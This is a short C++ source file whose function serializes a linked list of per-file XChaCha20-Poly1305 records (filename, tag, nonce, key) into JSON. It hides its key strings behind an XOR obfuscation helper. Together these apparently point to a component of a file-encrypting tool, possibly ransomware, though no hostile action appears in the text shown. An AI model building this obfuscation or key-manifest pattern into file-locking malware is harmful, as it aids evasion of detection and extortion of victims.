#include "jfunc.hpp"

char *serializeLinkedList(Node *head)
{
	cJSON *root = cJSON_CreateArray();

	while (head != NULL)
	{
		cJSON *nodeObject = cJSON_CreateObject();
		cJSON_AddStringToObject(nodeObject, sXOR("filename"), head->data.filename);
		cJSON_AddStringToObject(nodeObject, sXOR("tag"), base64Encode(head->data.tag, crypto_aead_xchacha20poly1305_ietf_ABYTES));
		cJSON_AddStringToObject(nodeObject, sXOR("iv"), base64Encode(head->data.keyiv.iv, crypto_aead_xchacha20poly1305_ietf_NPUBBYTES));
		cJSON_AddStringToObject(nodeObject, sXOR("key"), base64Encode(head->data.keyiv.key, crypto_aead_xchacha20poly1305_ietf_KEYBYTES));
		cJSON_AddItemToArray(root, nodeObject);
		head = head->next;
	}

	char *serialized = cJSON_Print(root);
	cJSON_Delete(root);
	return serialized;
}